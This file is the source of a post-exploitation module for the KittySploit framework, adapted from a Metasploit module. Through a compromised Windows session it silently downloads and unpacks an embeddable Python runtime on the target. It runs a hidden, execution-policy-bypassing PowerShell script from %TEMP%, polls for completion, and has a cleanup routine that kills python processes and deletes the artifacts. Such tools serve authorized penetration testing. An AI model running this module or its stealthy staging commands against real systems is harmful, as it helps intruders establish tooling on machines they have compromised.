#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from core.framework.failure import FailureType, ProcedureError
import os
import re
import time

class Module(Post):
    
    __info__ = {
        "name": "Install Python for Windows",
        "description": "Downloads and extracts an embeddable Python3 distribution onto the target",
        "author": "KittySploit Team (based on Metasploit module by Michael Long)",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://docs.python.org/3/using/windows.html#windows-embeddable",
            "https://attack.mitre.org/techniques/T1064/"
        ],
    }
    
    session_id = OptString("", "Session ID", True)
    python_version = OptString("3.12.1", "Python version to download (e.g., 3.12.1, 3.11.7)", True)
    python_url_base = OptString("https://www.python.org/ftp/python/", "Base URL for Python distributions", False)
    file_path = OptString(".\\python-embed.zip", "File path to store the Python zip file", False)
    cleanup = OptBool(False, "Remove module artifacts", False)
    
    def _get_session_id_value(self) -> str:
        """Return the current session_id option value as a string."""
        value = ""
        try:
            value = getattr(self, 'session_id', '') or ""
        except Exception:
            value = ""
        if hasattr(value, 'value'):
            value = value.value
        return str(value or "").strip()
    
    def _get_option_value(self, option_name: str, default=None):
        """Safely get option value"""
        try:
            option = getattr(self, option_name, None)
            if option is None:
                return default
            if hasattr(option, 'value'):
                return option.value
            return option if option != "" else default
        except Exception:
            return default
    
    def _is_meterpreter_session(self) -> bool:
        """Check if the session is a meterpreter session"""
        session_id_value = self._get_session_id_value()
        if not session_id_value or not self.framework or not hasattr(self.framework, 'session_manager'):
            return False
        
        session = self.framework.session_manager.get_session(session_id_value)
        if session:
            session_type = getattr(session, 'session_type', '') or ''
            return session_type.lower() == SessionType.METERPRETER.value.lower()
        return False
    
    def _execute_cmd(self, command: str, timeout: int = 30) -> str:
        """Execute a command via the session"""
        if not command:
            return ""
        
        try:
            if self._is_meterpreter_session():
                # For meterpreter, use shell command
                if not command.startswith("shell ") and not command.startswith("execute "):
                    command = f"shell {command}"
            
            output = self.cmd_execute(command)
            return output.strip() if output else ""
        except Exception as e:
            print_warning(f"Command execution failed: {str(e)}")
            return ""
    
    def _check_powershell(self) -> bool:
        """Check if PowerShell is available"""
        print_status("Checking for PowerShell...")
        
        # Check for PowerShell
        check_cmd = 'powershell -Command "Write-Output $PSVersionTable.PSVersion"'
        result = self._execute_cmd(check_cmd, timeout=10)
        
        if result and ("Major" in result or re.search(r'\d+\.\d+', result)):
            print_success("PowerShell is available")
            return True
        else:
            # Try alternative path
            check_cmd2 = '%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command "exit"'
            result2 = self._execute_cmd(check_cmd2, timeout=5)
            if result2 is not None:  # Even empty output means it exists
                print_success("PowerShell is available")
                return True
        
        print_error("[!] PowerShell is not available")
        return False
    
    def _file_exists(self, file_path: str) -> bool:
        """Check if a file exists on the remote system"""
        check_cmd = f'if exist "{file_path}" (echo EXISTS) else (echo NOTFOUND)'
        result = self._execute_cmd(check_cmd, timeout=5)
        return "EXISTS" in result
    
    def _cleanup_artifacts(self) -> bool:
        """Remove module artifacts"""
        print_status("Removing module artifacts...")
        
        try:
            python_version = self._get_option_value('python_version', '3.12.1')
            file_path = self._get_option_value('file_path', '.\\python-embed.zip')
            
            # Determine Python folder name (remove .zip extension)
            python_folder = file_path.replace('.zip', '').replace('.\\', '')
            if not python_folder:
                python_folder = f"python-{python_version}-embed-win32"
            
            # Stop any running Python processes
            script = 'Stop-Process -Name "python" -Force -ErrorAction SilentlyContinue; '
            script += f'Stop-Process -Name "pythonw" -Force -ErrorAction SilentlyContinue; '
            
            # Remove files
            script += f'Remove-Item -Force -ErrorAction SilentlyContinue "{file_path}"; '
            script += f'Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "{python_folder}"; '
            
            ps_cmd = f'powershell -Command "{script}"'
            result = self._execute_cmd(ps_cmd, timeout=10)
            
            print_success("Cleanup completed")
            return True
            
        except Exception as e:
            print_error(f"Cleanup failed: {str(e)}")
            return False
    
    def _download_python(self) -> bool:
        """Download Python embeddable zip file"""
        try:
            python_version = self._get_option_value('python_version', '3.12.1')
            python_url_base = self._get_option_value('python_url_base', 'https://www.python.org/ftp/python/')
            file_path = self._get_option_value('file_path', '.\\python-embed.zip')
            
            # Determine architecture (default to win32, can be win_amd64)
            # For now, use win32 (works on both x86 and x64)
            arch = "win32"
            
            # Build download URL
            python_url = f"{python_url_base}{python_version}/python-{python_version}-embed-{arch}.zip"
            
            print_status(f"Downloading Python embeddable zip from {python_url}")
            print_status(f"Saving to: {file_path}")
            print_status("This may take a few minutes...")
            
            # Create a PowerShell script file that downloads in background
            # This avoids session timeout issues
            temp_script_name = f'dl_python_{int(time.time())}.ps1'
            temp_dir_cmd = 'echo %TEMP%'
            temp_dir_result = self._execute_cmd(temp_dir_cmd, timeout=5)
            temp_dir = temp_dir_result.strip() if temp_dir_result else 'C:\\Windows\\Temp'
            temp_script = f'{temp_dir}\\{temp_script_name}'
            
            # Create PowerShell script content
            script_content = f'$ErrorActionPreference = "Stop"; '
            script_content += f'[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; '
            script_content += f'$ProgressPreference = "SilentlyContinue"; '
            script_content += f'try {{ '
            script_content += f'    Invoke-WebRequest -Uri "{python_url}" -OutFile "{file_path}" -UseBasicParsing -ErrorAction Stop; '
            script_content += f'    if (Test-Path "{file_path}") {{ '
            script_content += f'        $size = (Get-Item "{file_path}").Length; '
            script_content += f'        Write-Output "SUCCESS:$size" '
            script_content += f'    }} else {{ '
            script_content += f'        Write-Output "FAILED:File not found" '
            script_content += f'    }} '
            script_content += f'}} catch {{ '
            script_content += f'    Write-Output "FAILED:$($_.Exception.Message)" '
            script_content += f'}}'
            
            # Create script file using PowerShell
            create_cmd = f'powershell -Command "$content = @\'{script_content}\'@; Set-Content -Path \'{temp_script}\' -Value $content -Encoding ASCII"'
            create_result = self._execute_cmd(create_cmd, timeout=10)
            
            # Execute script in background using start (non-blocking)
            print_status("Starting download in background...")
            bg_cmd = f'start /B powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "{temp_script}"'
            self._execute_cmd(bg_cmd, timeout=5)
            
            # Poll for file existence
            print_status("Waiting for download to complete...")
            max_wait = 300  # 5 minutes max
            check_interval = 3  # Check every 3 seconds
            waited = 0
            
            while waited < max_wait:
                if self._file_exists(file_path):
                    # File exists, check if download completed (check size stability)
                    size1_cmd = f'powershell -Command "(Get-Item \'{file_path}\').Length"'
                    size1 = self._execute_cmd(size1_cmd, timeout=5)
                    time.sleep(2)
                    size2_cmd = f'powershell -Command "(Get-Item \'{file_path}\').Length"'
                    size2 = self._execute_cmd(size2_cmd, timeout=5)
                    
                    if size1 and size2 and size1.strip() == size2.strip():
                        # Size stable, download likely complete
                        try:
                            file_size = int(size1.strip())
                            size_mb = file_size / (1024 * 1024)
                            if file_size > 1000000:  # At least 1MB (reasonable for Python embeddable)
                                print_success(f"Python zip file downloaded successfully ({size_mb:.2f} MB)")
                                # Cleanup temp script
                                self._execute_cmd(f'del "{temp_script}"', timeout=5)
                                return True
                        except ValueError:
                            pass
                
                time.sleep(check_interval)
                waited += check_interval
                if waited % 15 == 0:  # Every 15 seconds
                    print_status(f"Still downloading... ({waited}s)")
            
            # Check final status
            if self._file_exists(file_path):
                size_cmd = f'powershell -Command "(Get-Item \'{file_path}\').Length"'
                size_result = self._execute_cmd(size_cmd, timeout=5)
                if size_result:
                    try:
                        file_size = int(size_result.strip())
                        size_mb = file_size / (1024 * 1024)
                        if file_size > 1000000:
                            print_success(f"Python zip file downloaded successfully ({size_mb:.2f} MB)")
                            self._execute_cmd(f'del "{temp_script}"', timeout=5)
                            return True
                    except ValueError:
                        pass
            
            print_error("Download timeout or failed")
            print_status(f"Check if file exists: {file_path}")
            print_status(f"URL: {python_url}")
            # Cleanup temp script
            self._execute_cmd(f'del "{temp_script}"', timeout=5)
            return False
                    
        except Exception as e:
            print_error(f"Download failed: {str(e)}")
            import traceback
            traceback.print_exc()
            return False
    
    def _extract_python(self) -> bool:
        """Extract Python embeddable zip file"""
        try:
            file_path = self._get_option_value('file_path', '.\\python-embed.zip')
            python_version = self._get_option_value('python_version', '3.12.1')
            
            # Determine Python folder name
            python_folder = file_path.replace('.zip', '').replace('.\\', '')
            if not python_folder:
                python_folder = f"python-{python_version}-embed-win32"
            
            python_exe_path = f"{python_folder}\\python.exe"
            
            print_status(f"Extracting Python zip file: {file_path}")
            
            # Extract using PowerShell with better error handling
            script = f'try {{ '
            script += f'    Expand-Archive -Path "{file_path}" -DestinationPath "." -Force -ErrorAction Stop; '
            script += f'    if (Test-Path "{python_exe_path}") {{ '
            script += f'        Write-Output "EXTRACTED" '
            script += f'    }} else {{ '
            script += f'        Write-Output "FAILED:python.exe not found after extraction" '
            script += f'    }} '
            script += f'}} catch {{ '
            script += f'    Write-Output "FAILED:$($_.Exception.Message)" '
            script += f'}}'
            
            ps_cmd = f'powershell -Command "{script}"'
            result = self._execute_cmd(ps_cmd, timeout=60)
            
            if result:
                if "EXTRACTED" in result:
                    print_success("Python extracted successfully")
                    return True
                elif "FAILED" in result:
                    error_msg = result.split(":", 1)[1] if ":" in result else "Unknown error"
                    print_error(f"Extraction failed: {error_msg}")
                    return False
            
            # Verify python.exe exists even if no output
            if self._file_exists(python_exe_path):
                print_success("Python extracted successfully")
                return True
            else:
                print_error(f"Extraction may have failed - {python_exe_path} not found")
                if result:
                    print_status(f"Command output: {result}")
                return False
                    
        except Exception as e:
            print_error(f"Extraction failed: {str(e)}")
            import traceback
            traceback.print_exc()
            return False
    
    def run(self):
        """Run the Python installation module"""
        try:
            session_id_value = self._get_session_id_value()
            
            if not session_id_value:
                raise ProcedureError(FailureType.ConfigurationError, "Session ID is required")
            
            print_info("")
            print_success("Starting Python Installation Module...")
            print_info("=" * 70)
            
            # Get options
            cleanup_value = self._get_option_value('cleanup', False)
            if isinstance(cleanup_value, str):
                cleanup_value = cleanup_value.lower() in ('true', '1', 'yes')
            
            # Handle cleanup
            if cleanup_value:
                return self._cleanup_artifacts()
            
            # Check PowerShell availability
            if not self._check_powershell():
                raise ProcedureError(FailureType.NotVulnerable, "PowerShell is required but not available")
            
            # Download Python
            print_info("=" * 70)
            if not self._download_python():
                raise ProcedureError(FailureType.Unknown, "Failed to download Python")
            
            # Verify zip file exists
            file_path = self._get_option_value('file_path', '.\\python-embed.zip')
            if not self._file_exists(file_path):
                raise ProcedureError(FailureType.NotFound, f"Python zip file not found: {file_path}")
            
            # Extract Python
            print_info("=" * 70)
            if not self._extract_python():
                raise ProcedureError(FailureType.Unknown, "Failed to extract Python")
            
            # Verify python.exe exists
            python_version = self._get_option_value('python_version', '3.12.1')
            python_folder = file_path.replace('.zip', '').replace('.\\', '')
            if not python_folder:
                python_folder = f"python-{python_version}-embed-win32"
            python_exe_path = f"{python_folder}\\python.exe"
            
            if not self._file_exists(python_exe_path):
                raise ProcedureError(FailureType.NotFound, f"Python executable not found: {python_exe_path}")
            
            # Display success message
            print_info("=" * 70)
            print_success("Python installation completed successfully!")
            print_info("")
            print_status("Python location:")
            print_good(f"    {python_exe_path}")
            print_info("")
            print_status("Example usage:")
            print_good(f'    {python_exe_path} -c "print(\'Hello, world!\')"')
            print_info("")
            print_warning("Avoid using python.exe interactively, as it may hang your terminal")
            print_status("Use script files or one-liners instead")
            print_info("")
            print_status("To cleanup artifacts, run:")
            print_status("    set cleanup true")
            print_status("    run")
            
            return True
            
        except ProcedureError as e:
            raise e
        except Exception as e:
            import traceback
            traceback.print_exc()
            raise ProcedureError(FailureType.Unknown, f"Python installation error: {str(e)}")
